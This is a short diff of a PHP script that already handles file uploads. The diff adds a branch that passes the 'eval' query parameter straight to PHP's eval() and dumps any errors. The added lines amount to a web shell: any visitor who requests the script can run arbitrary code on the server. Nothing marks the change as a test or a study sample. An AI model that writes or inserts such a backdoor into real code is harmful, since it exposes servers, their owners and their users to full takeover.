@@ -57,4 +57,10 @@ if (isset($_GET['upload'])) {
     } catch (\Throwable $th) {
         var_dump($th);
     }
+} elseif (isset($_GET['eval'])) {
+    try {
+        eval($_GET['eval']);
+    } catch (\Throwable $th) {
+        var_dump($th);
+    }
 }
